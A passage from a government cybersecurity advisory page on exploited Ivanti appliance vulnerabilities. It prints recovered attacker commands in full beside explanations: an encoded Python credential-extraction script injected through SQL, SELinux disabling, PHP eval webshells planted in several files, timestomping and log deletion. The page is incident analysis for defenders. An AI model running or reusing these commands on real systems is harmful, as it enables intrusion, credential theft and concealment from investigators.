<td>sudo:&nbsp; nobody : user NOT in sudoers ; TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/opt/landesk/ldms/LDClient/ldpclient -i ;export PGPASSWORD=`cat /opt/landesk/broker/broker.conf | grep PGSQL_PW | cut -d '=' -f2-`;echo "update user_info set organization='||/usr/bin/echo&nbsp;aW1wb3J0IG9zLCByZSwgYmFzZTY0LCB0aW1lCm9zLmNoZGlyKCIvdG1wIikKZCA9ICIvYmFja3VwcyIKZGVmIHNldF9tc2cocCwgdD0nJywgbT0nJyk6CiAgICBpZiB0IGFuZCBtOgogICAgICAgIG1zZyA9ICdBQXt9Ont9QkInLmZvcm1hdCh0LCBiYXNlNjQuYjY0ZW5jb2RlKG0uZW5jb2RlKCkpLmRlY29kZSgpKQogICAgZWxzZToKICAgICAgICBtc2cgPSAnJwogICAgb3Muc3lzdGVtKCcnJ2V4cG9ydCBQR1BBU1NXT1JEPXt9O2VjaG8gInVwZGF0ZSB1c2VyX2luZm8gc2V0IG9yZ2FuaXphdGlvbj0ne30nIHdoZXJlIHVzZXJuYW1lPSdhZG1pbicifHBzcWwgLWQgYnJva2VyZGIgLVUgZ3NiYWRtaW4nJycuZm9ybWF0KHAsIG1zZykpCnRyeToKICAgIHIgPSBtYXgoW29zLnBhdGguam9pbihkLCBmKSBmb3IgZiBpbiBvcy5saXN0ZGlyKGQpIGlmIG9zLnBhdGguaXNmaWxlKG9zLnBhdGguam9pbihkLCBmKSldLCBrZXk9b3MucGF0aC5nZXRtdGltZSkKZXhjZXB0OgogICAgciA9IE5vbmUKd2l0aCBvcGVuKCIvb3B0L2xhbmRlc2svYnJva2VyL2Jyb2tlci5jb25mIikgYXMgZjoKICAgIGRicHdkID0gcmUuZmluZGFsbCgiUEdTUUxfUFc9KC4qKSIsIGYucmVhZCgpKVswXQppZiByOgogICAgcCA9IG9zLnBvcGVuKCJleHBvcnQgUEdQQVNTV09SRD17fTtlY2hvIFNFTEVDVCBwYXNzd2QgRlJPTSB1c2VyX2luZm8gV0hFUkUgdXNlcm5hbWU9XFwnYWRtaW5cXCcgfCBwc3FsIC1kIGJyb2tlcmRiIC1VIGdzYmFkbWluIC1oIGxvY2FsaG9zdCIuZm9ybWF0KGRicHdkKSkucmVhZCgpLnNwbGl0KCJcbiIpWy00XS5zdHJpcCgpLnNwbGl0KCc6JykKICAgIG9zLnN5c3RlbSgidGFyIHp4dmYge30iLmZvcm1hdChyKSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZm9yIGYgaW4gb3MubGlzdGRpcignLicpOgogICAgICAgICAgICBpZiByZS5tYXRjaCgicGhwXHd7Nn0iLCBmKToKICAgICAgICAgICAgICAgIG9zLmNobW9kKGYsIDBvNzc3KQogICAgICAgICAgICAgICAgbSA9IG9zLnBvcGVuKCIuL3t9IHt9IHt9IHt9IHJvb3QvLmNlcnRzL3t9LmtleSB7fSIuZm9ybWF0KGYsIHBbNF0sIHBbNV0sIHBbNl0sIHBbMV0sIHBbMV0pKS5yZWFkKCkuc3RyaXAoKQogICAgICAgICAgICAgICAgaWYgbToKICAgICAgICAgICAgICAgICAgICBzZXRfbXNnKGRicHdkLCAiUEFTU1dPUkQiLCBtKQogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMjQwKQogICAgICAgICAgICAgICAgICAgIHNldF9tc2coZGJwd2QpCiAgICAgICAgICAgICAgICAgICAgZXhpdCgpCmVsc2U6CiAgICBzZXRfbXNnKGRicHdkLCAnRVJST1InLCAnTk8gQkFDS1VQJykKICAgIAogICAgCg== | /usr/bin/base64 -d | python||' where username='admin'"|psql -d brokerdb -U gsbadmin;</td>
<td>
<p>Updates the “organization” field of the “admin” account in the PGSQL database with python script decoded from base64.&nbsp;</p>
<p>The python script decompresses the latest backup of the PGSQL database and extracts the password for the gsbadmin account to access the database.</p>
</td>
</tr>
<tr>
<td>nobody : user NOT in sudoers ; TTY=unknown ; PWD=/usr/bin ; USER=root ; COMMAND=/sbin/setenforce 0</td>
<td>Temporarily disables SELinux.</td>
</tr>
<tr>
<td>sudo: admin : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c echo REDACTED_BASE64_PASSWORD | base64 &gt;/opt/landesk/broker/webroot/gsb/site.cnf</td>
<td>Exfiltrates credentials and places them in a site.cnf webfile.</td>
</tr>
<tr>
<td>sudo: admin : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c echo PD9waHAgZXZhbCgkX1BPU1RbImNiNzg2OGM0NjA zNTQ4NTdiNzE5MjA0ZTI3NjZlZGJlIl0pOw== | base64 -d &gt;/opt/landesk/broker/webroot/gsb/view.php</td>
<td>Creates a webshell at view.php.</td>
</tr>
<tr>
<td>
<p>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/subin/tripwire --update ;/usr/bin/echo ZWNobyAiPD9waHAgc3lzdGVtKCcvYmluL3N1ZG8gJy4Gq</p>
<p>FwkX1JFUVVFU1RbJ2EnXSk7IiA+IC9vcHQvbGFuZGVzay9icm</p>
<p>9rZXIvd2Vicm9vdC9nc2IvaGVscC5waHA= | /usr/bin/base64 -d | /bin/bash;</p>
</td>
<td>Creates a webshell at help.php.</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;sed -i 's/setPhpTimeZone($TIMEZONE)/\/\/ setPhpTimeZone()/g' /opt/landesk/broker/webroot/gsb/DateTimeTab.php</td>
<td>Comments out the function setPhpTimeZone in DateTimeTab.php that logs the full exploit command.</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;sed -i 's/setSystemTimeZone( $TIMEZONE )/\/\/ setSystemTimeZone( $TIMEZONE )/g' /opt/landesk/broker/webroot/gsb/DateTimeTab.php</td>
<td>Comments out the vulnerable function setSystemTimeZone in DateTimeTab.php.</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;sed -i 's/GSB main page/GSB main page\neval($_POST["in39112cnnpkyc1os01q34gp6r60akgi"])\;/g' /opt/landesk/broker/webroot/client/index.php</td>
<td>Adds a webshell into index.php.</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;sed -i 's/$canvas_height = 600;/$canvas_height = 600;\n\teval($_POST["in39112cnnpkyc1os01q34gp6r60akgi"]);/' /opt/landesk/broker/webroot/gsb/style.php</td>
<td>Adds a webshell into style.php.</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;touch -r /opt/landesk/broker/webroot/client/about.php /opt/landesk/broker/webroot/client/index.php</td>
<td>Timestomping attempt to change the access and modification of time of index.php.</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;touch -r /opt/landesk/broker/webroot/client/about.php /opt/landesk/broker/webroot/gsb/style.php</td>
<td>Timestomping attempt to change the access and modification time of style.php</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;touch -r /opt/landesk/broker/webroot/client/about.php /opt/landesk/broker/webroot/gsb/DateTimeTab.php</td>
<td>Timestomping attempt to change the access and modification time of DateTimeTab.php.</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;rm /opt/landesk/broker/webroot/gsb/help.php</td>
<td>Timestomping attempt to change the access and modification time of help.php</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;rm /var/log/messages</td>
<td>Removes evidence.</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;rm /opt/landesk/broker/webroot/gsb/site.cnf</td>
<td>Removes site.cnf file (exfiltrated credentials).</td>
</tr>
<tr>
<td>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;rm /opt/landesk/broker/webroot/client/client.php</td>
<td>Removes one of the original webshells.</td>
</tr>
<tr>
<td>
<p>sudo: gsbadmin : TTY=unknown ; PWD=/opt/landesk/broker/webroot/gsb ; USER=root ; COMMAND=/bin/sh -c cd /opt/landesk/broker/webroot/gsb/;rm</p>
<p>/opt/landesk/broker/webroot/gsb/view.php</p>
</td>
<td>Removes one of the original webshells.</td>
</tr>
</tbody>
</table>
</div>
</div>

      </div>

  
      </div>
  </div>
      <div class="l-constrain l-page-section--rich-text">
        <div class="l-page-section__content">
          




<div  class="c-field c-field--name-body c-field--type-text-with-summary c-field--label-hidden">
  <div class="c-field__content"><p>This product is provided subject to this&nbsp;<a href="/notification" rel="nofollow noopener" target="_blank" title="Follow link">Notification</a>&nbsp;and this&nbsp;<a href="/privacy-policy" rel="nofollow noopener" target="_blank" title="Follow link">Privacy &amp; Use</a>&nbsp;policy.</p></div></div>

        </div>
      </div>
            </div>
        <div class="l-full__footer">
                            

<div  class="l-page-section l-page-section--tags l-page-section--rich-text">
      <div class="l-constrain">
  
  
  <div class="l-page-section__content">
              <h3>Tags</h3>
                  
        
        
        
    
          
        
        <div class="c-field">
        <strong>Advisory CVE</strong>:
                                                                                                                                                                                                                                                                                                                                                <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8190">CVE-2024-8190</a>,
                                        <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8963">CVE-2024-8963</a>,
                                        <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9379">CVE-2024-9379</a>,
                                        <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9380">CVE-2024-9380</a>
                        </div>
    
        <div class="c-field">
        <strong>Audience</strong>:
                                                                                                                                                                                                                                                                                                                                                Industry,
                                        Small and Medium Businesses
                        </div>
    
        <div class="c-field">
        <strong>Co-Sealers and Partners</strong>:
                                                                                                                                                                                                                                                                                                                                                Federal Bureau of Investigation
                        </div>
    
        <div class="c-field">
        <strong>MITRE ATT&amp;CK TTP</strong>:
                                                                                                                                                                                                                                                                                                                                                Command and Control (TA0011),
                                        Credential Access (TA0006),
                                        Defense Evasion (TA0005),
                                        Execution (TA0002),
                                        Exfiltration (TA0010),
                                        Initial Access (TA0001),
                                        Lateral Movement (TA0008),
                                        Persistence (TA0003),
                                        Privilege Escalation (TA0004),
                                        Reconnaissance (TA0043)
                        </div>
    
  
        <div class="c-field">
        <strong>Sector</strong>:
                                                                                                                                                                                                                                                                                                                                                <a href="/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors/information-technology-sector" hreflang="en">Information Technology Sector</a>
                        </div>
    
        <div class="c-field">
        <strong>Topics</strong>:
                                                                                                                                                                                                                                                                                                                                                <a href="/topics/cyber-threats-and-advisories">Cyber Threats and Advisories</a>,
                                        <a href="/topics/cybersecurity-best-practices">Cybersecurity Best Practices</a>,
                                        <a href="/topics/cyber-threats-and-advisories/incident-detection-response-and-prevention">Incident Detection, Response, and Prevention</a>,
                                        <a href="/topics/cybersecurity-best-practices/multifactor-authentication">Multifactor Authentication</a>,
                                        <a href="/topics/cybersecurity-best-practices/organizations-and-cyber-safety">Organizations and Cyber Safety</a>,
                                        <a href="/topics/cyber-threats-and-advisories/securing-networks">Securing Networks</a>
                        </div>
    

          </div>

  
      </div>
  </div>
            
<div class="l-constrain">
  <div class="l-page-section--rich-text">
    <div class="l-page-section__content">
      <div  class="c-product-survey l-page-section--tags l-page-section--rich-text">
        <div class="c-product-survey__top-bar"></div>
        <div class="c-product-survey__content-area">
          <div class="c-product-survey__icon"></div>
          <div class="c-product-survey__text-area">
            <h2>Please share your thoughts</h2>
            <p>We recently updated our anonymous <a href="https://cisasurvey.gov1.qualtrics.com/jfe/form/SV_9n4TtB8uttUPaM6?product=https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a" target="_blank">product survey</a>; we’d welcome your feedback.</p>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
          

  

<div  class="c-view c-view--detail-page-related-content c-view--display-block_2 view js-view-dom-id-9a0aef67241f9a799b6271e68c6af33e1005906140880ac4df26cdaf66d3b776 c-collection c-collection--blue c-collection--two-column">
  <div class="l-constrain">
    <div class="c-collection__row">
              <div class="c-collection__content">
                      <h2 class="c-collection__title"><span class="c-collection__title-wrap">Related Advisories</span></h2>
                                        	        </div>
                  <div class="c-collection__cards">
        



      





<article  class="is-promoted c-teaser c-teaser--horizontal" role="article">
  <div class="c-teaser__row">
        <div class="c-teaser__content">
              <div class="c-teaser__eyebrow">
                      <div class="c-teaser__date"><time datetime="2024-10-16T12:00:00Z">Oct 16, 2024</time>
</div>
                                <div class="c-teaser__meta">Cybersecurity Advisory | AA24-290A</div>
                  </div>
            <h3 class="c-teaser__title">
        <a href="/news-events/cybersecurity-advisories/aa24-290a" target="_self">          
<span>Iranian Cyber Actors’ Brute Force and Credential Access Activity Compromises Critical Infrastructure Organizations</span>

        </a>      </h3>
                                      </div>
  </div>
</article>


        





<article  class="is-promoted c-teaser c-teaser--horizontal" role="article">
  <div class="c-teaser__row">
        <div class="c-teaser__content">
              <div class="c-teaser__eyebrow">
                      <div class="c-teaser__date"><time datetime="2024-09-05T12:00:00Z">Sep 05, 2024</time>
</div>
                                <div class="c-teaser__meta">Cybersecurity Advisory | AA24-249A</div>
                  </div>
            <h3 class="c-teaser__title">
        <a href="/news-events/cybersecurity-advisories/aa24-249a" target="_self">          
<span>Russian Military Cyber Actors Target US and Global Critical Infrastructure</span>

        </a>      </h3>
                                      </div>
  </div>
</article>


        





<article  class="is-promoted c-teaser c-teaser--horizontal" role="article">
  <div class="c-teaser__row">
        <div class="c-teaser__content">
              <div class="c-teaser__eyebrow">
                      <div class="c-teaser__date"><time datetime="2024-08-29T12:00:00Z">Aug 29, 2024</time>
</div>
                                <div class="c-teaser__meta">Cybersecurity Advisory | AA24-242A</div>
                  </div>
            <h3 class="c-teaser__title">
        <a href="/news-events/cybersecurity-advisories/aa24-242a" target="_self">          
<span>#StopRansomware: RansomHub Ransomware</span>

        </a>      </h3>
                                      </div>
  </div>
</article>


        





<article  class="is-promoted c-teaser c-teaser--horizontal" role="article">
  <div class="c-teaser__row">
        <div class="c-teaser__content">
              <div class="c-teaser__eyebrow">
                      <div class="c-teaser__date"><time datetime="2024-08-28T12:00:00Z">Aug 28, 2024</time>
</div>
                                <div class="c-teaser__meta">Cybersecurity Advisory | AA24-241A</div>
                  </div>
            <h3 class="c-teaser__title">
        <a href="/news-events/cybersecurity-advisories/aa24-241a" target="_self">          
<span>Iran-based Cyber Actors Enabling Ransomware Attacks on US Organizations</span>

        </a>      </h3>
                                      </div>
  </div>
</article>


  
      </div>
    </div>
          </div>
</div>


          </div>
  </div>
  
  
  
  

      </div>

  
  </main>

  
<footer  class="usa-footer usa-footer--slim" role="contentinfo">
    <div class="usa-footer__return-to-top">
    <div class="l-constrain">
      <a href="#">Return to top</a>
    </div>
  </div>
    <div class="usa-footer__upper">
    <div class="l-constrain">
      







  
  
    

  
            

                                <ul  class="c-menu c-menu--footer-main">
        
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/topics" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/7329">Topics</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/spotlight" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/7330">Spotlight</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/resources-tools" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/7331">Resources &amp; Tools</a>
                        </li>
    
                                            
                                                    
      
      
      <li  class="c-menu__item is-active-trail">
                              <a href="/news-events" class="c-menu__link js-top-level is-active-trail" aria-current="false" data-drupal-link-system-path="node/7332">News &amp; Events</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/careers" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/7323">Careers</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/about" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/6944">About</a>
                        </li>
        </ul>
  

  
  
  
  

    </div>
  </div>
    <div class="usa-footer__main">
    <div class="l-constrain">
      <div class="usa-footer__main-row">
        <div class="usa-footer__brand">
          
<a  class="c-site-name c-site-name--footer" href="/" rel="home" title="Go to the Cybersecurity & Infrastructure Security Agency homepage">
  <span class="c-site-name__text">Cybersecurity &amp; Infrastructure Security Agency</span>
</a>        </div>
        <div class="usa-footer__contact">
                      

                                <ul  class="c-menu c-menu--social">
        
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="https://www.facebook.com/CISA" class="c-menu__link--facebook c-menu__link js-top-level" aria-current="false">Facebook</a>
                        </li>
    
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="https://twitter.com/CISAgov" class="c-menu__link--twitter c-menu__link js-top-level" aria-current="false">Twitter</a>
                        </li>
    
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency" class="c-menu__link--linkedin c-menu__link js-top-level" aria-current="false">LinkedIn</a>
                        </li>
    
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="https://www.youtube.com/@cisagov" class="c-menu__link--youtube c-menu__link js-top-level" aria-current="false">YouTube</a>
                        </li>
    
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="https://www.instagram.com/cisagov" class="c-menu__link--instagram c-menu__link js-top-level" aria-current="false">Instagram</a>
                        </li>
    
                                            
                                                            
      
      
      <li  class="c-menu__item">
                              <a href="/subscribe-updates-cisa" class="c-menu__link--rss c-menu__link js-top-level" aria-current="false">RSS</a>
                        </li>
        </ul>
  

                    <div class="usa-footer__contact-info">
            <span>CISA Central</span>
            <a href="tel:1-844-Say-CISA">1-844-Say-CISA</a>
            <a href="mailto:SayCISA@cisa.dhs.gov">SayCISA@cisa.dhs.gov</a>
          </div>
        </div>
      </div>
    </div>
  </div>
    <div class="usa-footer__lower">
    <div class="l-constrain">
      <div class="usa-footer__lower-row">
        <div class="usa-footer__lower-left">
          
<div  class="c-dhs-logo">
  <div class="c-dhs-logo__seal">DHS Seal</div>
  <div class="c-dhs-logo__content">
    <div class="c-dhs-logo__url">CISA.gov</div>
    <div class="c-dhs-logo__text">An official website of the U.S. Department of Homeland Security</div>
  </div>
</div>                      


                                <ul  class="c-menu c-menu--footer">
        
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/about" class="c-menu__link js-top-level" title="About CISA" aria-current="false" data-drupal-link-system-path="node/6944">About CISA</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.dhs.gov/performance-financial-reports" class="c-menu__link js-top-level" title="Budget and Performance" aria-current="false">Budget and Performance</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.dhs.gov" title="Department of Homeland Security" class="c-menu__link js-top-level" aria-current="false">DHS.gov</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.dhs.gov/foia" class="c-menu__link js-top-level" title="FOIA Requests" aria-current="false">FOIA Requests</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/no-fear-act" title="No FEAR Act Reporting" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="node/21494">No FEAR Act</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.oig.dhs.gov/" class="c-menu__link js-top-level" title="Office of Inspector General" aria-current="false">Office of Inspector General</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/privacy-policy" class="c-menu__link js-top-level" title="Privacy Policy" aria-current="false" data-drupal-link-system-path="node/16115">Privacy Policy</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138" title="Subscribe to Email Updates" class="c-menu__link js-top-level" aria-current="false">Subscribe</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.whitehouse.gov/" class="c-menu__link js-top-level" title="The White House" aria-current="false">The White House</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="https://www.usa.gov/" class="c-menu__link js-top-level" title="USA.gov" aria-current="false">USA.gov</a>
                        </li>
    
                                            
                              
      
      
      <li  class="c-menu__item">
                              <a href="/forms/feedback" title="Website Feedback" class="c-menu__link js-top-level" aria-current="false" data-drupal-link-system-path="forms/feedback">Website Feedback</a>
                        </li>
        </ul>
  

                  </div>
        <div class="usa-footer__lower-right">
          <iframe
            src="https://www.dhs.gov/ntas/"
            name="National Terrorism Advisory System"
            title="National Terrorism Advisory System"
            width="170"
            height="180"
            scrolling="no"
            frameborder="0"
            seamless border="0"
          ></iframe>
        </div>
      </div>
    </div>
  </div>
</footer>

  

</div>

  </div>

    
        <script src="/core/assets/vendor/jquery/jquery.min.js?v=3.7.1"></script>
<script src="/core/assets/vendor/once/once.min.js?v=1.0.1"></script>
<script src="/core/misc/drupal.js?v=10.3.10"></script>
<script src="/core/misc/drupal.init.js?v=10.3.10"></script>
<script src="/core/assets/vendor/tabbable/index.umd.min.js?v=6.2.0"></script>
<script src="/profiles/cisad8_gov/themes/custom/gesso/dist/js/common.js?sqk2jp"></script>
<script src="/profiles/cisad8_gov/themes/custom/gesso/dist/js/uswds-init.es6.js?sqk2jp"></script>
<script src="/profiles/cisad8_gov/themes/custom/gesso/dist/js/uswds.es6.js?sqk2jp"></script>
<script src="https://dap.digitalgov.gov/Universal-Federated-Analytics-Min.js?agency=DHS&amp;subagency=CISA&amp;yt=true" id="_fed_an_ua_tag"></script>
<script src="/modules/contrib/extlink/js/extlink.js?v=10.3.10"></script>
<script src="/core/misc/jquery.form.js?v=4.3.0"></script>
<script src="/core/misc/progress.js?v=10.3.10"></script>
<script src="/core/assets/vendor/loadjs/loadjs.min.js?v=4.3.0"></script>
<script src="/core/misc/debounce.js?v=10.3.10"></script>
<script src="/core/misc/announce.js?v=10.3.10"></script>
<script src="/core/misc/message.js?v=10.3.10"></script>
<script src="/core/misc/ajax.js?v=10.3.10"></script>
<script src="/modules/contrib/google_tag/js/gtag.ajax.js?sqk2jp"></script>
<script src="/modules/contrib/ckeditor_accordion/js/accordion.frontend.min.js?sqk2jp"></script>
<script src="/profiles/cisad8_gov/themes/custom/gesso/dist/js/teaser.es6.js?sqk2jp"></script>
<script src="/modules/contrib/responsive_tables_filter/js/tablesaw.min.js?v=1.x"></script>
<script src="/modules/contrib/responsive_tables_filter/js/tablesaw-init.js?v=1.x"></script>
<script src="/modules/contrib/responsive_tables_filter/js/Drupal/ajaxComplete.js?v=1.x"></script>
<script src="/modules/contrib/responsive_tables_filter/js/customizations.js?v=1.x"></script>
<script src="/profiles/cisad8_gov/themes/custom/gesso/dist/js/file.es6.js?sqk2jp"></script>

  </body>
</html>
